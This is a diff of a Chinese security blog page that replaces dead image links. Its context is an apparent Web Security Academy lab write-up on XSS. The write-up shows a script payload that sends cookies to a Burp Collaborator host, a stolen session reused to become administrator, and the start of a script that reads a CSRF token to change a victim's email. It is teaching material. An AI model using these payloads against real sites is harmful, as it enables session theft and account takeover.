@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-cn">
 <head>
 
   <meta charset="utf-8" />
@@ -241,10 +241,13 @@
 <li>攻击者通过获取的 cookie 则可以成为应用的合法用户并执行任何操作</li>
 </ol>
 <p>创建 web 服务非常简单，可以使用 python 命令既可以创建服务，<code>python -m SimpleHTTPServer 80</code>。这样就可以指定一个监听 80 端口的 web 服务。其实 Burp 提供了一个非常实用的利用功能，通过 Burp Collobrator Client 就可以创建一个开放在外网的 web 服务，这样如果你在日常测试中，就无须自己准备一个带有固定 IP 的服务器来创建服务了。</p>
-<p><img src="https://s2.ax1x.com/2020/02/19/3ExZJH.png" alt="3ExZJH.png"></p>
-<p><img src="https://s2.ax1x.com/2020/02/19/3Exlef.png" alt="3Exlef.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>进入到 Collobrator Client，点击 Copy to clipborad 就可以将服务地址复制到剪切板。我们可以使用 curl 来进行测试：</p>
-<p><img src="https://s2.ax1x.com/2020/02/25/3tuMAU.gif" alt="3tuMAU.gif"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>我们可以看到在 client 中可以看到 DNS 请求以及相应的 HTTP 请求，这样通过 Collobrator Client 就不需要在外网自己的服务器下搭建服务。让我们继续重现上面的利用过程，首先我们先准备好要利用的 XSS 的 payload：</p>
 <pre tabindex="0"><code>&lt;script&gt;
 fetch(&#39;https://d8mzva8z7ou9zrnqkgz49jltyk4asz.burpcollaborator.net&#39;,{
@@ -254,13 +257,19 @@ fetch(&#39;https://d8mzva8z7ou9zrnqkgz49jltyk4asz.burpcollaborator.net&#39;,{
 })
 &lt;/script&gt;
 </code></pre><p>然后我们只需要在 Collobrator Client 等待请求过来，不出意外的话，我们可以看到 administrator 的 cookie。</p>
-<p><img src="https://s2.ax1x.com/2020/02/27/3ax38K.png" alt="3ax38K.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>下面我们只需要打开浏览器开发者工具，总控制台中输入 <code>document.cookie = 'session=Xn8ow3pdmd6LWktVZPJtBlI9yKzIKUX3'</code>，刷新一下页面，我们就成为管理员了。</p>
-<p><img src="https://s2.ax1x.com/2020/02/27/3axGvD.png" alt="3axGvD.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <h3 id="通过-xss-来实现-csrf">通过 XSS 来实现 CSRF</h3>
 <p>上述的攻击手法有一定的限制之处，而且容易被受害者发现。而配合 CSRF 漏洞，攻击者可以实现执行受害者可以执行的任何操作，并且隐秘性更强。比如我们可以修改用户的邮箱，从而可以充值用户密码。如果受害者是管理员的话，甚至往往可以实现添加用户，删除用户。CSRF 漏洞的防御机制一般是通过 token 来进行防御，但是如果你的应用有 XSS 漏洞，那么这种防御机制就会失效，因为通过 JS 我们就可以获取 token。下面继续通过一个 lab 来演示这种类型的攻击方式：</p>
 <p>这个 lab 和之前的一样，这一次我们需要通过 XSS 漏洞来配合 CSRF 漏洞来实现修改受害者的邮箱。首先我们可以通过一个普通用户登录应用，然后发现有一个可以修改邮箱的功能。</p>
-<p><img src="https://s2.ax1x.com/2020/03/01/3cJFkq.png" alt="3cJFkq.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>通过 Burp 可以捕获修改邮箱的请求：</p>
 <pre tabindex="0"><code>POST /email/change-email HTTP/1.1
 Host: acee1f9f1f96dfe38027996900d70058.web-security-academy.net
@@ -287,7 +296,9 @@ email=bbb%40bbb.com&amp;csrf=xmLrs2P4dtFVurZlCUVpJsBnvaGlL4T1
 <li>首先请求修改邮箱功能的页面，获取页面响应。</li>
 <li>在页面响应中匹配 csrf，然后提交修改邮箱的 POST 请求。</li>
 </ol>
-<p><img src="https://s2.ax1x.com/2020/03/01/3ctH0J.png" alt="3ctH0J.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
